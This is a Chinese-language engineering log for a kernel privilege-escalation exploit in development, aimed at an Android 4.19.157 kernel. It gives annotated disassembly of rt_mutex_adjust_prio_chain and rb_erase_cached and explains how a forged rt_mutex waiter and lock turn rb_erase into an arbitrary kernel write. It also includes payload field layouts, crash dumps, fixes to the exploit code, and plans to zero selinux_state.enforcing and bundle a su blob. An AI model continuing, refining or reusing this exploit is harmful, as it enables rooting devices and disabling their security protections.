# T2' B 分支：reb_erase 可达性实证与三个 craft 缺陷

日期：2026-10-26
目标固件：`4.19.157-perf-g77c132eccfab-dirty #38`，`_text = 0xffffff8008080000`，slide = 0
分析用 ELF：`out_dump/elf/vmlinux_38.elf`（自建，121896 符号）

---

## 0. 一句话结论

`rb_erase_cached` **确实被调用**（B8 实验用 0x4141 探针拿到 `kernel_panic`），
但三种 `PSELECT_LOCK_SHAPE` 都没能让 `init_uts_ns.sysname` 发生变化。
断点已不在"能不能走到"，而在"写出去的那 8 字节落到哪"。

`analysis/T2P_LOCK_MISMATCH.md` 里"`waiter->lock` 自洽检查拦住整条路"的结论**作废**：
那道 `cmp` 是能过的，当时把"trylock 失败的死循环"误判成了"cmp 拦截"。

---

## 1. 反汇编事实（`rt_mutex_adjust_prio_chain` @ `0xffffff8008149eb0`）

### 1.1 参数与调用者

`rt_mutex_adjust_pi` @ `0xffffff8008149e00`：

```
+0x20  ldr  x8,  [x19, #0x8d0]     ; waiter = task->pi_blocked_on
+0x2c  ldr  w9,  [x19, #0xac]      ; task->prio
+0x30  ldr  w10, [x8,  #0x40]      ; waiter->prio
+0x34  cmp  w10, w9
+0x38  b.ne +0x5c                  ; 不等才进 chain
+0x5c  ldr  x21, [x8, #0x38]       ; next_lock = waiter->lock   ← 第 1 次读
+0x68  unlock_irqsave(task->pi_lock)
+0x70  chain(task, chwalk=0, orig_waiter=NULL, orig_lock=x21, top_lock=NULL, task)
```

chain 入口：`x19 = task`，`x21 = orig_lock`，`x22 = top_lock = NULL`，`x23 = orig_waiter = NULL`，`w24 = chwalk = 0`，`w28 = 1`。

### 1.2 主循环

```
+0x01c  ldr  x25, [x19, #0x8d0]    ; waiter = task->pi_blocked_on  ← 第 2 次读
+0x020  cbz  x25, -> +0x70c        ; 空则返回
+0x024  ldur x8,  [x29, #-8]       ; x22 = top_lock
+0x028  cbz  x8,  -> +0x12c        ; top_lock==0 → 走 +0x12c
...
+0x12c  ldr  x8,  [x25, #0x38]     ; waiter->lock
+0x130  cmp  x21, x8
+0x134  b.ne +0x70c                ; ★ 自洽检查：不等直接返回
+0x138  ldr  w8,  [x19, #0xac]     ; task->prio
+0x13c  ldr  w9,  [x25, #0x40]     ; waiter->prio
+0x140  cmp  w9,  w8
+0x144  b.ne +0x2c8                ; ★ prio 不等 → trylock，w28 保持 1
+0x148  tbnz w8,  #0x1f, +0x154    ; 只有 RT(prio<0) 才比 deadline
+0x168  csel w28, w28, wzr, eq     ; ★ prio 相等且 deadline 不等 → w28 = 0
+0x2c8  mov  x0, x21
+0x2cc  bl   _raw_spin_trylock
+0x2d0  cbnz w0, +0x1d4            ; ★ 成功才继续；失败 → unlock/yield/retry
+0x1d4  ldr  x8,  [x21, #0x18]     ; lock->owner
+0x1ec  and  x8,  x8,  #~1
+0x1f0  cmp  x8,  x9               ; == task ?
+0x1f4  b.eq +0x744                ; 相等 → 返回
+0x1f8  tbnz w28, #0, +0x2f4       ; ★ w28=1 → dequeue 段
                                   ;   w28=0 → +0x1fc PI 深链遍历
+0x2f4  ldr  x8,  [x21, #0x10]     ; lock->waiters.rb_leftmost
+0x300  ldr  x8,  [x8,  #0x38]     ; rb_leftmost->lock
+0x304  cmp  x8,  x21              ; 必须等于本锁
+0x308  b.ne +0x830                ; 不等 → brk #0x800（必 panic）
+0x314  ldr  x8,  [x25]            ; waiter->tree_entry.__rb_parent_color
+0x318  cmp  x8,  x25              ; RB_EMPTY_NODE(node) ?
+0x31c  b.eq +0x334                ; 是 → 跳过 erase
+0x329  bl   rb_erase_cached       ; ★★★ 写原语入口
```

### 1.3 `rb_erase_cached` @ `0xffffff800944aa50`

```
+0x000  ldp  x9, x8, [x0, #8]      ; x9 = node->rb_right(+0x08), x8 = node->rb_left(+0x10)
+0x004  adds x10, x1, #8           ; x10 = &root->rb_leftmost
+0x00c  ldr  x11, [x10]
+0x010  cmp  x11, x0
+0x014  b.eq +0x064                ; ★ rb_leftmost == node → cached 分支（无任意写）
+0x018  cbz  x8,  +0x168
+0x01c  cbz  x9,  +0x078           ; ★ rb_right == 0 → case1
+0x078  ldr  x10, [x0]             ; parent_color
+0x07c  ands x9,  x10, #~3         ; parent
+0x080  str  x10, [x8]             ; ★ *(node->rb_left) = parent_color
+0x084  b.eq +0x128                ; parent == 0
+0x088  ldr  x10, [x9, #0x10]      ; parent->rb_left
+0x08c  cmp  x10, x0
+0x090  b.eq +0x130
+0x094  str  x8,  [x9, #0x08]      ; *(parent+8) = node->rb_left → 命中 target
+0x098  ret
```

结论：任意写只在 `+0x080`（写 `node->rb_left` 指向处）和 `+0x094`（写 `parent+8`）两处，
**且前提是 `rb_leftmost != node`**。

---

## 2. 实验矩阵

所有实验共用：`delay = PSELECT_ROUTE_DELAY_USEC`，`FAKE_LOCK_HELD=0`，`WRITE_ORACLE` 见列。

| tag | 关键 env | 结果 | 判读 |
|---|---|---|---|
| B1 | delay=0, PARENT_CRASH | 卡住（`system_server` D 态，loadavg 29→111） | consumer 早于 pselect 写入，chain 拿旧锁死循环 |
| B2 | delay=5ms, uts | 正常结束，无写 | 到过 trylock，未产生写 |
| B3 | delay=5ms, `LOCK_CRASH`(lock=0x41) | **kernel_panic** | `0x41` 被解引用 → chain 越过 `+0x134` |
| B5 | delay=5ms, `LOCK_OWNER_CRASH`(owner=0x41) | **kernel_panic** | 只有 `w28=0` 的 `+0x1fc` 深链才解引用 owner |
| B8 | delay=5ms, PARENT_CRASH, 无 PAD | **kernel_panic** | 0x4141 只能被 rb_erase 当父指针解引用 → **rb_erase 可达** |
| B9 | +`RB_LEFTMOST_PAD` | 无写，panic | 自检确认 pad 生效，仍无写 |
| B10 | +PAD, shape=2（parent=value, left=target） | 无写，panic | 一步写 target 也不成立 |
| B11/B12 | +PAD, shape=3（parent=0, left=target 零写） | 无写，panic | 零写也不成立 |

`B8` 与 `B2` 唯一差别是 `parent_color`，所以 B8 的 panic 只能来自
`rb_erase_cached` 内部对父指针的解引用 —— 这是本文件最重要的一条硬证据。

### 2.1 payload 自检（B9 实测）

```
payload-lock: wait=0000000000000000
              rb_node=ffffff80004413a0      (= fake_w0)
              leftmost=ffffff8000440550     (≠ fake_w0，PAD 生效)
              owner=ffffff8000442381        (= fake_task | 1)
              pad38=ffffff80004404d0        (= fake_lock，供 +0x2f4 校验)
```

`PSELECT_LOCK_SHAPE` 对应写进 waiter 的字段：

```
+0x00 __rb_parent_color   word 0 -> global 15 -> out[5]
+0x08 rb_right            word 1 -> global 16 -> out[6]
+0x10 rb_left             word 2 -> global 17 -> out[7]
+0x30 task                word 6 -> global 21 -> ex[1]
+0x38 lock                word 7 -> global 22 -> ex[2]
+0x40 prio                word 8 -> global 23 -> ex[3]
```

---

## 3. 本轮修掉的三个 craft 缺陷

### 3.1 `FAKE_LOCK_HELD` 语义是反的

原注释称"wait_lock=0 时 trylock 必成功，rb_erase 永远不执行"，据此在 payload 里把
`wait_lock` 置 1。反汇编显示 `+0x2d0 cbnz w0, +0x1d4` —— **成功才继续**，置 1 会让
内核停在 `+0x2cc` 的 unlock/yield/retry 死循环里，永远到不了 `+0x329`。

P4 那次"RC=124 + loadavg 111"就是这条死循环，却被当成"gadget 没打中"的证据。

### 3.2 `rb_leftmost` 遮住了 case1

`fake_lock + 0x10`（waiters.rb_leftmost）原来直接填 `fake_w0`，而 `fake_w0` 正是
`rb_erase_cached` 的 node 参数，于是 `+0x010 cmp` 成立，走 `+0x064` cached 分支：
那条路只做 `str x11,[x10]`（重挂 rb_leftmost），**没有任意写**。

新增 `RB_LEFTMOST_PAD`：把 rb_leftmost 指向独立的 pad 槽
`payload_base + LOCK_OFF + 0x80`，并在 pad 槽 `+0x38` 补 `fake_lock`
（满足 chain `+0x300` 的 `rb_leftmost->lock == lock` 校验）。

### 3.3 `WRITE_ORACLE=uts` 的写值不能当指针

`shape0` 里 `write_value` 同时是 node 的 `rb_left` 指针，`+0x080` 会执行
`*(write_value) = parent_color`。`uts` 模式把写值填成 `0x454c4341524f4c47`（"GLORACLE"），
这个地址不可写 —— 还没执行到 `+0x094` 写 target 就先 fault。

新增 `WRITE_ORACLE=uts_fops`：target 仍指 UTS sysname，**写值保持 `fake_fops`（页内地址）**。

---

## 4. 未解断点

现象：`rb_erase` 被调用（B8），但 shape0/2/3 都不改 `sysname`，且都 panic。

两个候选，需要一个能**自读**的判据来区分：

1. **`data_addr(INIT_UTS_NS)` 与运行时不一致。**
   `P0_KERNEL_PHYS_LOAD = 0x80080000` 来自模板，从未被实证。
   boot header v2 的 `kernel_addr` 字段是 `0x8000`（legacy 占位），ELF 的 `p_paddr`
   是 `vmlinux-to-elf` 重建时填的 `vaddr`，两者都不能作证。
   若差 0x180000 之类，写就落到别的物理页，`sysname` 不变还顺手打死别的结构 ——
   与全部观察一致。

2. **B8 的 panic 与 case1 不是同一条路径。**
   0x4141 也可能在 cached 分支 `+0x138` 的 `ldr x12,[x11,#8]` 处解引用。
   若 B8 走的是 cached，则"rb_erase 可达"成立但"case1 可达"仍未证。

### 已就位但尚未跑通的观测器

`dump_reclaim_page()`：`reclaim_sv` 是 AF_UNIX socketpair，payload 发出去后 skb 数据区
挂在内核接收队列，用 `recv(MSG_PEEK|MSG_DONTWAIT)` 可**无损回读**那块内存。
`pre-pselect` / `post-chain` 两次采样能直接看到：

- `fops[0]` 是否被 `+0x080` 覆盖成 `parent_color`
- `lock.wait` 是否被 trylock 置位
- `waiter.__rb_parent_color` 是否被继续改写

B12 在 prepare 阶段就 panic，没跑到采样点；需要设备状态稳定后重跑。

---

## 5. 下一步（按优先级）

1. **跑通 `dump_reclaim_page`**：一次运行就能把"写了 / 没写 / 写到哪"三者分开，
   不再依赖 UTS 判据。
2. **EDL dump 实证内核物理加载地址**：dump 物理 `0x80000000` 起 64 MiB，
   搜 `"Linux version 4.19.157"`（`linux_banner` @ `0xffffff8009600018`），
   得到真实 `P0_KERNEL_PHYS_LOAD` 后修正 `target.h`。
3. **第二判据**：`selinux_state.enforcing`（@ `0xffffff800c128000`）置 0，
   用 `/sys/fs/selinux/enforce` 读回。该地址与 UTS 不同页，可交叉验证地址算法。

---

## 6. 本轮代码改动

| 文件 | 改动 |
|---|---|
| `exploit/src/util.c` | `RB_LEFTMOST_PAD`、`PI_TREE_PAD`、`WRITE_ORACLE=uts_fops`、`payload-lock` 自检、`dump_reclaim_page()`、`leaked==0‖base==PAGE_OFFSET` 双重判据 |
| `exploit/src/fops.c` | `PSELECT_LOCK_SHAPE=3`（零写形态）、`pre-pselect`/`post-chain` 回读采样 |
| `exploit/src/main.c` | consumer 打印目标线程 `/proc/self/task/<tid>/stat` 的 prio/nice |
| `exploit/src/common.h` | `set_reclaim_recv_fd` / `dump_reclaim_page` 声明 |
| `build_preload.sh` | 补齐 `su_blob.S` / `wallpaper_blob.S`，产出可加载的 so |

构建：`./build_preload.sh` → `leaf5-ghostlock/out/exploit/aarch64/preload.so`
运行：`./t2p_b2.sh <tag> <delay_usec> [ENV...]`

---

## 7. 2026-10-27 追加：链尾 `wake_up_process(0)` 的真凶（已修）

### 7.1 B54 的崩溃不是写原语失败，是我们自己涂的 0

B54 现场（`PSELECT_LOCK_ZERO=1 SKIP_LEAK=1 PAINT_SRC=sigret WRITE_TARGET_SELINUX=1`）：

```
pc : _raw_spin_lock_irqsave+0x30/0x60
lr : try_to_wake_up+0x48/0x6e0
x0 : 00000000000008ac          ← wake_up_process 的 task == 0
Call trace: ... rt_mutex_adjust_prio_chain+0x820/0x848
```

反查 chain 尾部（`0xffffff800814a68c` 起）：

```
+0x7dc  ldr x8, [x21, #0x10]    ; lock->waiters.rb_leftmost  ← 重排后就是我们的 waiter
+0x7e4  ldr x10,[x8, #0x38]     ; top->lock，必须 == lock（否则 brk）
+0x800  cmp x10, [sp]           ; 与保存的 top_waiter 比较，相等就跳过 wake
+0x818  ldr x0, [x8, #0x30]     ; ★ top_waiter->task  ← 就是 waiter+0x30
+0x81c  bl  wake_up_process
```

`waiter+0x30` 就是 paint 的 word 6。而默认 ENVS 里带着 `USE_FAKE_TASK=1`，
`SKIP_LEAK=1` 时 `fake_task == 0`，所以 `w[6]` 被抹成 0：

```
[*] waiter word[6] task = 0000000000000000
```

⇒ `wake_up_process(NULL)` ⇒ `try_to_wake_up` 读 `p->pi_lock`（`+0x8ac`）当场 fault。
**写原语在 B54 里已经跑完（erase → 任意写 → rt_mutex_enqueue 全过），
整条链是被我们自己填的 0 打死的。**

修法（`fops.c:build_waiter_words`）：`fake_task` 拿不到就退回 `init_task`。
`init_task` 恒为 `TASK_RUNNING`，`try_to_wake_up` 在拿完 `pi_lock` 后第一句
`if (!(p->state & state))` 就返回，不排队、不切调度。

修完 B56/B57 的日志里 `word[6] = ffffff800b81c180`，这条已钉死。

### 7.2 paint 几何二次确认（B58）

`WAITER_TAG=1 WAITER_TAG_KEEPLOCK=1`（当前构建，默认 `SIGRET_WDELTA=0xe8`）：

```
x0  : ffffff8027773cd8        ; waiter
x9  : 7a67000000000001        ; w[1] → waiter+0x08
x8  : 7a67000000000002        ; w[2] → waiter+0x10
x21 : ffffff800c127990        ; w[7] → waiter+0x38
x1  : ffffff800c127998        ; root = lock+8
fault: 0067000000000011       ; = w[1] + 0x10，rb_erase_cached+0x20
```

`w[i] → waiter + 8*i`，delta 0xe8 正确，不需要改。

### 7.3 仍未解决：shape0 下 erase 落进"两个孩子"分支

同样的 build、同样的 delta、同样 5 ms 延迟：

| | 关键 env | 现场 |
|---|---|---|
| B54 | `WRITE_TARGET_SELINUX`，`w[6]=0` | erase 成功 → 链尾 `wake_up_process(0)` |
| B56 | 同上 + `w[6]` 已修 | `rb_erase_cached+0xb8` 写只读页 `ffffff9ad0a88ab0`，`x9(=[waiter+0x08])=lock` |
| B57 | 同上，delay 拉到 50 ms | `rb_erase_cached+0xc8` NULL @ 0x90，`[waiter+0x00]=0x80` |

B58 证明 `w[1]=tag1` 确实落在 `+0x08`；shape0 里 `w[1]=0`，`+0x1c cbz x9` 必然
跳 `+0x78`（case1），**结构上到不了 `+0xb8`**。而 B56/B57 却到了，且
`[waiter+0x08]` 是 lock（≠ 0）、`[waiter+0x00]` 是 0x80（≠ `w[0]`）。

⇒ 这两次运行里 waiter 的 `+0x00/+0x08/+0x10` 与 paint 不一致，只有
`+0x38` 一致。要么 paint 没整块落地，要么落地后被别的东西改写了。
`lr` 一直是 `chain+0x32c`（第一处 erase），排除"第二处 pi_tree erase"。

下一步就一件事：用 `SIGRET_WDELTA` 做三点扫（0xd8 / 0xe8 / 0xf8）各配
`WAITER_TAG_KEEPLOCK`，看 `x9/x8` 是否随 delta 平移。平移 ⇒ paint 落点漂移；
不平移 ⇒ `+0x00..+0x10` 被内核改写，得去查 chain 在 erase 之前对这 24 字节的写。

